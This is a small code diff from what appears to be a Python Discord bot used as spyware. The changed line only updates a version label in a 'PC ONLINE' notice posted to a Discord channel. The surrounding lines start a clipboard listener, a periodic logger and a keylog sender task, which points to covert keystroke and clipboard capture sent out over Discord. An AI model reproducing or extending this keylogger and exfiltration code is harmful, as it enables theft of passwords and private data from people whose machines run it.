@@ -593,7 +593,7 @@ async def on_ready():
     threading.Thread(target=clipboard_listener, daemon=True).start()
     
     channel = bot.get_channel(CHANNEL_ID)
-    if channel: await channel.send(embed=discord.Embed(title="🟢 PC ONLINE", description=f"**{MY_PC_NAME}** siap.\n\n**VERSI BOT: v1.1 (UPDATED!)**", color=discord.Color.green()))
+    if channel: await channel.send(embed=discord.Embed(title="🟢 PC ONLINE", description=f"**{MY_PC_NAME}** siap.\n\n**VERSI BOT: v1.2 (UPDATED!)**", color=discord.Color.green()))
     
     if not periodic_log.is_running(): periodic_log.start()
     if not keylog_sender_task.is_running(): keylog_sender_task.start()
